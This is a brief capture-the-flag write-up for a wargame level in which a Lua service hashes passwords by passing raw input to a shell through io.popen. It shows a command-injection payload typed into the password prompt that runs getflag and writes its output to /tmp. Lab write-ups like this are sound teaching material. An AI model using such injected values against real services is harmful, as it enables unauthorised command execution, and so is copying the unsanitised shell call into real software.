# Write up

Here we have a `level11.lua` file, which currently throw an error if we try to execute it :
``` 
lua: level11.lua:3: address already in use
stack traceback:
       [C]: in function 'assert'
       level11.lua:3: in main chunk
       [C]: ?
```
The lua script uses the port 5151, so we check if it's in use : `netstat -tulpn | grep LISTEN`
And it is : `tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -`
Sadly the p option to show the processes requiere root access.

We check the process with `ps -aux`
And see that the flag11 account is using the current lua script :
`flag11    1668  0.0  0.0   2892   828 ?        S    03:10   0:00 lua /home/user/level11/level11.lua`

So we will have to request the local 5151 port directly.
With the `nc localhost 5151` command, we will directly be prompted a Password.

The lua script contains this line in the hash function : `prog = io.popen("echo "..pass.." | sha1sum", "r")`
Where pass in raw user input, however, the lua script doesn't print the evaluated string.

We can get the flag by injecting the getflag commend and redirect his result inside the /tmp folder, for exemple :
```
Password: a;getflag>/tmp/lidl;echo a
```
Which gives us the flag.
